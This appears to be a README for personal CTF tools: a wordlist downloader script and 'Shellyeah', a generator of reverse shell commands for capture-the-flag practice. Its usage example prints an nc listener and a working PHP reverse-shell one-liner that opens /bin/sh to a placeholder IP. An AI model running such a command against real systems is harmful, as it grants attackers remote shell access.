## CTF tools
I've developed some personal tools to help with CTFs. Maybe you'll find them useful. They're available [here](https://github.com/Touhottaja/ctf_tools).

### WL-Fetcher
[WL-Fetcher](https://github.com/Touhottaja/ctf_tools/blob/main/wl_fetcher.sh) is bash script for downloading wordlists from multiple sources.

#### Usage
```
$ mkdir wordlists/
$ chmod +x wl_fetcher.sh
$ ./wl_fetcher.sh -d wordlists/  # Fetches the wordlists
$ ./wl_fetcher.sh -u wordlists/  # Fetches changes for the wordlists
```

### Shellyeah
[Shellyeah](https://github.com/Touhottaja/ctf_tools) is a CLI tool (with an awful large ASCII art) for generating reverse shell commands.

#### Usage
```
$ sudo ln -s [<Path to shellyeah.py>]/shellyeah.py /usr/local/bin/shellyeah
$ chmod +x shellyeah
$ shellyeah -a 1.2.3.4 -p 1234 -s "php exec"

 _______________________________________
< Shell Yeah! - Reverse Shell Generator >
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\

Listener command:
nc -lvnp 1234

Reverse shell command:
php -r '$sock=fsockopen("1.2.3.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
